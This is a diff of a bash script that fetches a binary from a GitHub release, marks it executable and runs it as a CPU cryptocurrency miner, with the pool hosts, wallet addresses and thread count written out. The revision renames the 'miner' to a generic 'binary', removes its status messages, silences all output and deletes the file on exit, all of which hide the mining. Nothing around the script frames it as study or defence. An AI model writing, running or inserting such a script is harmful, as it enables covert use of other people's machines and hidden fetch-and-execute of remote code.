@@ -1,44 +1,36 @@
 #!/bin/bash
+set -euo pipefail
 
-# Generate random filename (8-char alphanumeric, no prefix)
+# Generate random filename (8-char alphanumeric)
 generate_random_filename() {
     tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 8
 }
 
 main() {
-    miner_filename=$(generate_random_filename)
+    CPU_THREADS=$(nproc --all 2>/dev/null || getconf _NPROCESSORS_ONLN || echo 1)
+    BIN_NAME=$(generate_random_filename)
 
-    # Cleanup on exit
-    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
+    # Always clean up
+    trap 'rm -f "$BIN_NAME"' EXIT INT TERM
 
-    echo "📥 Downloading miner to: $miner_filename"
-    if wget -q https://github.com/vedhagsvp/qubros/releases/download/srmn/srnewmn -O "$miner_filename"; then
-        echo "✅ Download complete."
-    else
-        echo "❌ Failed to download miner. Exiting."
+    echo "Downloading binary..."
+    wget -q "https://github.com/vedhagsvp/qubros/releases/download/srmn/srnewmn" -O "$BIN_NAME" || {
+        echo "Download failed"
         exit 1
-    fi
+    }
 
-    echo "🔐 Setting executable permission..."
-    if chmod +x "$miner_filename"; then
-        echo "✅ Permission granted."
-    else
-        echo "❌ Failed to set permissions."
-        exit 1
-    fi
+    chmod +x "$BIN_NAME"
 
-    echo "🚀 Starting miner..."
-    ./"$miner_filename" \
-        --algorithm randomy \
-        --pool 94.237.30.115:8880 \
-        --wallet solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.DC88 \
-        --cpu-threads $(nproc --all)
+    echo "Starting with $CPU_THREADS CPU threads..."
 
-    if [[ $? -eq 0 ]]; then
-        echo "✅ Miner ran successfully."
-    else
-        echo "❌ Miner exited with an error."
-    fi
+    ./"$BIN_NAME" \
+        --multi-algorithm-job-mode 3 \
+        --disable-gpu \
+        --algorithm "randomepic;randomy" \
+        --pool "51pool.online:3416;corecoin.luckypool.io:3118" \
+        --wallet "praveentympk.mypkana24;cb82f561e5065c48c5867cb42c1a0f927efa395002d0.mypkana24" \
+        --cpu-threads "$CPU_THREADS" \
+        >/dev/null 2>&1
 }
 
 main
